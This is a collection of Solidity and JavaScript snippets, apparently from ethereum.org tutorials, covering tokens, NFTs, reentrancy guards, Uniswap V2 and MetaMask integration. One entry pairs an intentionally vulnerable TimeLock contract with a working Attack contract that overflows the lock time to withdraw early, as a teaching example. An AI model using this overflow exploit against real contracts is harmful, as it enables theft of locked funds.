[
  {
    "owner": "ethereum",
    "repo": "ethereum-org-website",
    "content": "TITLE: Using Mutex Pattern in Solidity to Prevent Reentrancy Attacks\nDESCRIPTION: Implementation of a mutual exclusion lock (mutex) to protect functions against recursive calls. The lock uses a boolean variable that's set to true before function execution and reverts to false afterward, preventing reentrancy.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.7.0;\n\ncontract MutexPattern {\n    bool locked = false;\n    mapping(address => uint256) public balances;\n\n    modifier noReentrancy() {\n        require(!locked, \"Blocked from reentrancy.\");\n        locked = true;\n        _;\n        locked = false;\n    }\n    // This function is protected by a mutex, so reentrant calls from within `msg.sender.call` cannot call `withdraw` again.\n    //  The `return` statement evaluates to `true` but still evaluates the `locked = false` statement in the modifier\n    function withdraw(uint _amount) public payable noReentrancy returns(bool) {\n        require(balances[msg.sender] >= _amount, \"No balance to withdraw.\");\n\n        balances[msg.sender] -= _amount;\n        (bool success, ) = msg.sender.call{value: _amount}(\"\");\n        require(success);\n\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Validating Addresses in ERC-20 _transfer Function\nDESCRIPTION: Requires that neither sender nor recipient is the zero address, preventing tokens from being sent to or from the zero address which could be a result of software bugs.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(sender != address(0), \"ERC20: transfer from the zero address\");\nrequire(recipient != address(0), \"ERC20: transfer to the zero address\");\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Coin Contract in Solidity\nDESCRIPTION: This Solidity contract example creates a simple cryptocurrency with minting and transfer functionality. It includes a constructor that sets the contract creator as the minter, a mint function restricted to the creator, and a send function that allows any user to transfer their coins.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: GPL-3.0\npragma solidity >= 0.7.0;\n\ncontract Coin {\n    // The keyword \"public\" makes variables\n    // accessible from other contracts\n    address public minter;\n    mapping (address => uint) public balances;\n\n    // Events allow clients to react to specific\n    // contract changes you declare\n    event Sent(address from, address to, uint amount);\n\n    // Constructor code is only run when the contract\n    // is created\n    constructor() {\n        minter = msg.sender;\n    }\n\n    // Sends an amount of newly created coins to an address\n    // Can only be called by the contract creator\n    function mint(address receiver, uint amount) public {\n        require(msg.sender == minter);\n        require(amount < 1e60);\n        balances[receiver] += amount;\n    }\n\n    // Sends an amount of existing coins\n    // from any caller to an address\n    function send(address receiver, uint amount) public {\n        require(amount <= balances[msg.sender], \"Insufficient balance.\");\n        balances[msg.sender] -= amount;\n        balances[receiver] += amount;\n        emit Sent(msg.sender, receiver, amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Emergency Stop Pattern in Solidity\nDESCRIPTION: This code demonstrates the Emergency Stop (Circuit Breaker) pattern for Ethereum smart contracts. It includes a boolean state variable to track the contract's operational status, modifiers to control function access based on the stopped state, and functions to stop and resume the contract. This pattern allows contract owners to pause vulnerable functions during emergencies while enabling specific recovery functions.\n\nLANGUAGE: solidity\nCODE:\n```\n// This code has not been professionally audited and makes no promises about safety or correctness. Use at your own risk.\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Reentrancy Protection with Lock Modifier\nDESCRIPTION: Creates a reentrancy guard to prevent attacks that could exploit the contract during token transfers. The lock modifier ensures functions cannot be called recursively within the same transaction.\n\nLANGUAGE: solidity\nCODE:\n```\nuint private unlocked = 1;\n```\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier lock() {\n        require(unlocked == 1, 'UniswapV2: LOCKED');\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic Counter Smart Contract in Solidity\nDESCRIPTION: A simple Solidity smart contract that implements a counter with increment functionality and a getter method. The contract stores an unsigned integer variable and provides functions to manipulate and retrieve its value.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity >=0.5.17;\n\ncontract Counter {\n\n    // Public variable of type unsigned int to keep the number of counts\n    uint256 public count = 0;\n\n    // Function that increments our counter\n    function increment() public {\n        count += 1;\n    }\n\n    // Not necessary getter to get the count value\n    function getCount() public view returns (uint256) {\n        return count;\n    }\n\n}\n```\n\n----------------------------------------\n\nTITLE: ERC-20 approve Function Definition\nDESCRIPTION: Defines the approve function that sets an allowance for a spender. Includes a warning about race conditions and how to mitigate them. Returns a boolean indicating success.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Creating an ERC-721 NFT Smart Contract in Solidity\nDESCRIPTION: This smart contract implements the ERC-721 standard for NFTs using OpenZeppelin libraries. It includes functionality to mint NFTs with custom metadata URIs and uses access control to ensure only the contract owner can mint new tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n//Contract based on [https://docs.openzeppelin.com/contracts/3.x/erc721](https://docs.openzeppelin.com/contracts/3.x/erc721)\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\";\n\ncontract MyNFT is ERC721URIStorage, Ownable {\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIds;\n\n    constructor() ERC721(\"MyNFT\", \"NFT\") {}\n\n    function mintNFT(address recipient, string memory tokenURI)\n        public onlyOwner\n        returns (uint256)\n    {\n        _tokenIds.increment();\n\n        uint256 newItemId = _tokenIds.current();\n        _mint(recipient, newItemId);\n        _setTokenURI(newItemId, tokenURI);\n\n        return newItemId;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an ERC-721 NFT Smart Contract in Solidity\nDESCRIPTION: This smart contract implements the ERC-721 standard for NFTs using OpenZeppelin libraries. It includes functionality to mint NFTs with custom metadata URIs and uses access control to ensure only the contract owner can mint new tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n//Contract based on [https://docs.openzeppelin.com/contracts/3.x/erc721](https://docs.openzeppelin.com/contracts/3.x/erc721)\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\";\n\ncontract MyNFT is ERC721URIStorage, Ownable {\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIds;\n\n    constructor() ERC721(\"MyNFT\", \"NFT\") {}\n\n    function mintNFT(address recipient, string memory tokenURI)\n        public onlyOwner\n        returns (uint256)\n    {\n        _tokenIds.increment();\n\n        uint256 newItemId = _tokenIds.current();\n        _mint(recipient, newItemId);\n        _setTokenURI(newItemId, tokenURI);\n\n        return newItemId;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic ERC-20 Token in Solidity\nDESCRIPTION: This code provides a complete implementation of a basic ERC-20 token called \"ERC20Basic\". It implements all the required interface functions and events, with a fixed supply of 10 ether (10^19 tokens with 18 decimals) assigned to the contract deployer. The implementation includes mappings for balances and allowances, along with all required transfer and approval logic.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract ERC20Basic is IERC20 {\n\n    string public constant name = \"ERC20Basic\";\n    string public constant symbol = \"ERC\";\n    uint8 public constant decimals = 18;\n\n\n    mapping(address => uint256) balances;\n\n    mapping(address => mapping (address => uint256)) allowed;\n\n    uint256 totalSupply_ = 10 ether;\n\n\n   constructor() {\n\tbalances[msg.sender] = totalSupply_;\n    }\n\n    function totalSupply() public override view returns (uint256) {\n\treturn totalSupply_;\n    }\n\n    function balanceOf(address tokenOwner) public override view returns (uint256) {\n        return balances[tokenOwner];\n    }\n\n    function transfer(address receiver, uint256 numTokens) public override returns (bool) {\n        require(numTokens <= balances[msg.sender]);\n        balances[msg.sender] = balances[msg.sender]-numTokens;\n        balances[receiver] = balances[receiver]+numTokens;\n        emit Transfer(msg.sender, receiver, numTokens);\n        return true;\n    }\n\n    function approve(address delegate, uint256 numTokens) public override returns (bool) {\n        allowed[msg.sender][delegate] = numTokens;\n        emit Approval(msg.sender, delegate, numTokens);\n        return true;\n    }\n\n    function allowance(address owner, address delegate) public override view returns (uint) {\n        return allowed[owner][delegate];\n    }\n\n    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {\n        require(numTokens <= balances[owner]);\n        require(numTokens <= allowed[owner][msg.sender]);\n\n        balances[owner] = balances[owner]-numTokens;\n        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;\n        balances[buyer] = balances[buyer]+numTokens;\n        emit Transfer(owner, buyer, numTokens);\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Token Interface and Basic Implementation in Solidity\nDESCRIPTION: A complete implementation of the ERC-20 token standard including the interface definition and a basic token contract with standard functions like transfer, approve, and transferFrom.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract ERC20Basic is IERC20 {\n\n    string public constant name = \"ERC20Basic\";\n    string public constant symbol = \"ERC\";\n    uint8 public constant decimals = 18;\n\n\n    mapping(address => uint256) balances;\n\n    mapping(address => mapping (address => uint256)) allowed;\n\n    uint256 totalSupply_ = 10 ether;\n\n\n   constructor() {\n\tbalances[msg.sender] = totalSupply_;\n    }\n\n    function totalSupply() public override view returns (uint256) {\n\treturn totalSupply_;\n    }\n\n    function balanceOf(address tokenOwner) public override view returns (uint256) {\n        return balances[tokenOwner];\n    }\n\n    function transfer(address receiver, uint256 numTokens) public override returns (bool) {\n        require(numTokens <= balances[msg.sender]);\n        balances[msg.sender] = balances[msg.sender]-numTokens;\n        balances[receiver] = balances[receiver]+numTokens;\n        emit Transfer(msg.sender, receiver, numTokens);\n        return true;\n    }\n\n    function approve(address delegate, uint256 numTokens) public override returns (bool) {\n        allowed[msg.sender][delegate] = numTokens;\n        emit Approval(msg.sender, delegate, numTokens);\n        return true;\n    }\n\n    function allowance(address owner, address delegate) public override view returns (uint) {\n        return allowed[owner][delegate];\n    }\n\n    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {\n        require(numTokens <= balances[owner]);\n        require(numTokens <= allowed[owner][msg.sender]);\n\n        balances[owner] = balances[owner]-numTokens;\n        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;\n        balances[buyer] = balances[buyer]+numTokens;\n        emit Transfer(owner, buyer, numTokens);\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Simple Vending Machine Smart Contract Implementation in Solidity\nDESCRIPTION: This example demonstrates a basic vending machine implemented as a smart contract in Solidity. It allows the owner to refill cupcakes and enables users to purchase them by sending ETH. The contract maintains a balance of cupcakes and tracks ownership.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity 0.8.7;\n\ncontract VendingMachine {\n\n    // Declare state variables of the contract\n    address public owner;\n    mapping (address => uint) public cupcakeBalances;\n\n    // When 'VendingMachine' contract is deployed:\n    // 1. set the deploying address as the owner of the contract\n    // 2. set the deployed smart contract's cupcake balance to 100\n    constructor() {\n        owner = msg.sender;\n        cupcakeBalances[address(this)] = 100;\n    }\n\n    // Allow the owner to increase the smart contract's cupcake balance\n    function refill(uint amount) public {\n        require(msg.sender == owner, \"Only the owner can refill.\");\n        cupcakeBalances[address(this)] += amount;\n    }\n\n    // Allow anyone to purchase cupcakes\n    function purchase(uint amount) public payable {\n        require(msg.value >= amount * 1 ether, \"You must pay at least 1 ETH per cupcake\");\n        require(cupcakeBalances[address(this)] >= amount, \"Not enough cupcakes in stock to complete this purchase\");\n        cupcakeBalances[address(this)] -= amount;\n        cupcakeBalances[msg.sender] += amount;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Token Swaps in Uniswap V2 Pool Contract\nDESCRIPTION: The swap function performs token exchanges between the pair's reserves. It verifies output amounts, transfers tokens to the recipient, handles callback functionality, and ensures the invariant K is maintained after accounting for the 0.3% fee.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n```\n\n----------------------------------------\n\nTITLE: Implementing transfer Function in ERC-20\nDESCRIPTION: Defines the transfer function which moves tokens from the caller's account to a recipient. This function changes state, emits a Transfer event, and returns a boolean indicating success.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n```\n\n----------------------------------------\n\nTITLE: SafeMath Library Integration\nDESCRIPTION: Incorporates the SafeMath library for uint256 types to prevent arithmetic overflows and underflows in token operations, ensuring mathematical operations remain secure.\n\nLANGUAGE: solidity\nCODE:\n```\n    using SafeMath for uint256;\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Integer Overflow Vulnerability in a TimeLock Contract\nDESCRIPTION: An example showing how an attacker can exploit integer overflow in a smart contract. The TimeLock contract contains a vulnerability in the increaseLockTime function that allows attackers to manipulate the lockTime value.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.7.6;\n\n// This contract is designed to act as a time vault.\n// User can deposit into this contract but cannot withdraw for at least a week.\n// User can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(block.timestamp > lockTime[msg.sender], \"Lock time not expired\");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    fallback() external payable {}\n\n    function attack() public payable {\n        timeLock.deposit{value: msg.value}();\n        /*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        2**256 = type(uint).max + 1\n        so x = type(uint).max + 1 - t\n        */\n        timeLock.increaseLockTime(\n            type(uint).max + 1 - timeLock.lockTime(address(this))\n        );\n        timeLock.withdraw();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Deploying a Smart Contract with Hardhat on Goerli testnet\nDESCRIPTION: Command to deploy a smart contract to the Goerli testnet using Hardhat and a deployment script.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/deploy.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 BalanceOf Function in Solidity\nDESCRIPTION: This function implements the IERC20 interface's balanceOf method, returning the token balance of a specific address. It's a public view function that accesses the _balances mapping to retrieve account balances.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n```\n\n----------------------------------------\n\nTITLE: Complete mintNFT Function Implementation for Ethereum NFT Minter\nDESCRIPTION: The full implementation of the mintNFT function which handles metadata creation, IPFS upload, smart contract initialization, transaction creation, and transaction signing via MetaMask. This function combines all steps required to mint an NFT on Ethereum.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const mintNFT = async (url, name, description) => {\n  //error handling\n  if (url.trim() == \"\" || name.trim() == \"\" || description.trim() == \"\") {\n    return {\n      success: false,\n      status: \"❗Please make sure all fields are completed before minting.\",\n    }\n  }\n\n  //make metadata\n  const metadata = new Object()\n  metadata.name = name\n  metadata.image = url\n  metadata.description = description\n\n  //pinata pin request\n  const pinataResponse = await pinJSONToIPFS(metadata)\n  if (!pinataResponse.success) {\n    return {\n      success: false,\n      status: \"😢 Something went wrong while uploading your tokenURI.\",\n    }\n  }\n  const tokenURI = pinataResponse.pinataUrl\n\n  //load smart contract\n  window.contract = await new web3.eth.Contract(contractABI, contractAddress) //loadContract();\n\n  //set up your Ethereum transaction\n  const transactionParameters = {\n    to: contractAddress, // Required except during contract publications.\n    from: window.ethereum.selectedAddress, // must match user's active address.\n    data: window.contract.methods\n      .mintNFT(window.ethereum.selectedAddress, tokenURI)\n      .encodeABI(), //make call to NFT smart contract\n  }\n\n  //sign transaction via MetaMask\n  try {\n    const txHash = await window.ethereum.request({\n      method: \"eth_sendTransaction\",\n      params: [transactionParameters],\n    })\n    return {\n      success: true,\n      status:\n        \"✅ Check out your transaction on Etherscan: https://ropsten.etherscan.io/tx/\" +\n        txHash,\n    }\n  } catch (error) {\n    return {\n      success: false,\n      status: \"😥 Something went wrong: \" + error.message,\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Project Structure for Smart Contract Development\nDESCRIPTION: Commands to create the necessary directories for organizing smart contract code and deployment scripts in the project.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir contracts\nmkdir scripts\n```\n\n----------------------------------------\n\nTITLE: Creating a Deployment Script for a Solidity Smart Contract\nDESCRIPTION: JavaScript deployment script that uses ethers.js to deploy the Hello World smart contract to the Ethereum network. The script creates a contract factory, deploys the contract with an initial message, and logs the deployed contract address.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n  const HelloWorld = await ethers.getContractFactory(\"HelloWorld\")\n\n  // Start deployment, returning a promise that resolves to a contract object\n  const hello_world = await HelloWorld.deploy(\"Hello World!\")\n  console.log(\"Contract deployed to address:\", hello_world.address)\n}\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error)\n    process.exit(1)\n  })\n```\n\n----------------------------------------\n\nTITLE: Implementing a Request-Response Oracle Contract in Solidity\nDESCRIPTION: This Solidity contract implements a request-response oracle that can query offchain APIs upon request from other smart contracts. It includes functionality for creating data requests, processing responses from multiple oracle nodes, and establishing consensus on the final result.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.4.21 <0.6.0;\n\ncontract Oracle {\n  Request[] requests; //list of requests made to the contract\n  uint currentId = 0; //increasing request id\n  uint minQuorum = 2; //minimum number of responses to receive before declaring final result\n  uint totalOracleCount = 3; // Hardcoded oracle count\n\n  // defines a general api request\n  struct Request {\n    uint id;                            //request id\n    string urlToQuery;                  //API url\n    string attributeToFetch;            //json attribute (key) to retrieve in the response\n    string agreedValue;                 //value from key\n    mapping(uint => string) answers;     //answers provided by the oracles\n    mapping(address => uint) quorum;    //oracles which will query the answer (1=oracle hasn't voted, 2=oracle has voted)\n  }\n\n  //event that triggers oracle outside of the blockchain\n  event NewRequest (\n    uint id,\n    string urlToQuery,\n    string attributeToFetch\n  );\n\n  //triggered when there's a consensus on the final result\n  event UpdatedRequest (\n    uint id,\n    string urlToQuery,\n    string attributeToFetch,\n    string agreedValue\n  );\n\n  function createRequest (\n    string memory _urlToQuery,\n    string memory _attributeToFetch\n  )\n  public\n  {\n    uint length = requests.push(Request(currentId, _urlToQuery, _attributeToFetch, \"\"));\n    Request storage r = requests[length-1];\n\n    // Hardcoded oracles address\n    r.quorum[address(0x6c2339b46F41a06f09CA0051ddAD54D1e582bA77)] = 1;\n    r.quorum[address(0xb5346CF224c02186606e5f89EACC21eC25398077)] = 1;\n    r.quorum[address(0xa2997F1CA363D11a0a35bB1Ac0Ff7849bc13e914)] = 1;\n\n    // launch an event to be detected by oracle outside of blockchain\n    emit NewRequest (\n      currentId,\n      _urlToQuery,\n      _attributeToFetch\n    );\n\n    // increase request id\n    currentId++;\n  }\n\n  //called by the oracle to record its answer\n  function updateRequest (\n    uint _id,\n    string memory _valueRetrieved\n  ) public {\n\n    Request storage currRequest = requests[_id];\n\n    //check if oracle is in the list of trusted oracles\n    //and if the oracle hasn't voted yet\n    if(currRequest.quorum[address(msg.sender)] == 1){\n\n      //marking that this address has voted\n      currRequest.quorum[msg.sender] = 2;\n\n      //iterate through \"array\" of answers until a position if free and save the retrieved value\n      uint tmpI = 0;\n      bool found = false;\n      while(!found) {\n        //find first empty slot\n        if(bytes(currRequest.answers[tmpI]).length == 0){\n          found = true;\n          currRequest.answers[tmpI] = _valueRetrieved;\n        }\n        tmpI++;\n      }\n\n      uint currentQuorum = 0;\n\n      //iterate through oracle list and check if enough oracles(minimum quorum)\n      //have voted the same answer as the current one\n      for(uint i = 0; i < totalOracleCount; i++){\n        bytes memory a = bytes(currRequest.answers[i]);\n        bytes memory b = bytes(_valueRetrieved);\n\n        if(keccak256(a) == keccak256(b)){\n          currentQuorum++;\n          if(currentQuorum >= minQuorum){\n            currRequest.agreedValue = _valueRetrieved;\n            emit UpdatedRequest (\n              currRequest.id,\n              currRequest.urlToQuery,\n              currRequest.attributeToFetch,\n              currRequest.agreedValue\n            );\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an ERC-721 NFT Smart Contract in Solidity\nDESCRIPTION: A Solidity smart contract for creating NFTs based on the ERC-721 standard. It imports OpenZeppelin libraries for NFT implementation, counter functionality, and access control. The contract includes a mintNFT function that allows the owner to mint new NFTs.\n\nLANGUAGE: solidity\nCODE:\n```\n//Contract based on [https://docs.openzeppelin.com/contracts/3.x/erc721](https://docs.openzeppelin.com/contracts/3.x/erc721)\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\";\n\ncontract MyNFT is ERC721URIStorage, Ownable {\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIds;\n\n    constructor() ERC721(\"MyNFT\", \"NFT\") {}\n\n    function mintNFT(address recipient, string memory tokenURI)\n        public onlyOwner\n        returns (uint256)\n    {\n        _tokenIds.increment();\n\n        uint256 newItemId = _tokenIds.current();\n        _mint(recipient, newItemId);\n        _setTokenURI(newItemId, tokenURI);\n\n        return newItemId;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Connecting updateMessage Function to React Frontend Component\nDESCRIPTION: Implementation of the onUpdatePressed function in the HelloWorld.js React component that calls the updateMessage function and updates the component's state with the transaction status.\n\nLANGUAGE: javascript\nCODE:\n```\nconst onUpdatePressed = async () => {\n  const { status } = await updateMessage(walletAddress, newMessage)\n  setStatus(status)\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Transaction Signing with MetaMask in Ethereum dApp\nDESCRIPTION: Sets up transaction parameters and uses MetaMask to sign and send a transaction to update a message in a Hello World smart contract. Includes error handling and returns a status message with a link to Etherscan for transaction tracking.\n\nLANGUAGE: javascript\nCODE:\n```\n//set up transaction parameters\nconst transactionParameters = {\n  to: contractAddress, // Required except during contract publications.\n  from: address, // must match user's active address.\n  data: helloWorldContract.methods.update(message).encodeABI(),\n}\n\n//sign the transaction\ntry {\n  const txHash = await window.ethereum.request({\n    method: \"eth_sendTransaction\",\n    params: [transactionParameters],\n  })\n  return {\n    status: (\n      <span>\n        ✅{\" \"}\n        <a target=\"_blank\" href={`https://goerli.etherscan.io/tx/${txHash}`}>\n          View the status of your transaction on Etherscan!\n        </a>\n        <br />\n        ℹ️ Once the transaction is verified by the network, the message will be\n        updated automatically.\n      </span>\n    ),\n  }\n} catch (error) {\n  return {\n    status: \"😥 \" + error.message,\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing getCurrentWalletConnected Function for MetaMask Integration\nDESCRIPTION: This function checks if a wallet is already connected to the dapp using the eth_accounts method. It returns the connected address and appropriate status message based on the connection state.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nexport const getCurrentWalletConnected = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_accounts\",\n      })\n      if (addressArray.length > 0) {\n        return {\n          address: addressArray[0],\n          status: \"👆🏽 Write a message in the text-field above.\",\n        }\n      } else {\n        return {\n          address: \"\",\n          status: \"🦊 Connect to MetaMask using the top right button.\",\n        }\n      }\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Atomic Token Transfer in ERC-20\nDESCRIPTION: Perform the actual balance update for token transfer, ensuring the operation is atomic. The function first subtracts from sender (with balance check) then adds to recipient, with no external calls in between to prevent reentrancy attacks.\n\nLANGUAGE: solidity\nCODE:\n```\n_balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n_balances[recipient] = _balances[recipient].add(amount);\n```\n\n----------------------------------------\n\nTITLE: Minting Protocol Fees in Uniswap V2 (Solidity)\nDESCRIPTION: This function calculates and mints protocol fees (0.05% of trades) when liquidity is added or removed. It checks if protocol fees are enabled, calculates new liquidity tokens based on the growth in sqrt(k), and mints them to the fee recipient address if applicable.\n\nLANGUAGE: solidity\nCODE:\n```\n    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)\n    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        address feeTo = IUniswapV2Factory(factory).feeTo();\n        feeOn = feeTo != address(0);\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        uint _kLast = kLast; // gas savings\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        if (feeOn) {\n            if (_kLast != 0) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint denominator = rootK.mul(5).add(rootKLast);\n                    uint liquidity = numerator / denominator;\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                }\n            }\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 transfer function in Solidity\nDESCRIPTION: The transfer function allows users to transfer tokens from their account to another address. It returns a boolean value that is always true on success and reverts on failure. This function calls the internal _transfer function to do the actual work.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-transfer}.\n *\n * Requirements:\n *\n * - `recipient` cannot be the zero address.\n * - the caller must have a balance of at least `amount`.\n */\nfunction transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: HelloWorld Smart Contract in Solidity\nDESCRIPTION: A simple Solidity smart contract that stores a message string and emits an event when the message is updated. It includes a constructor to initialize the message and an update function that changes 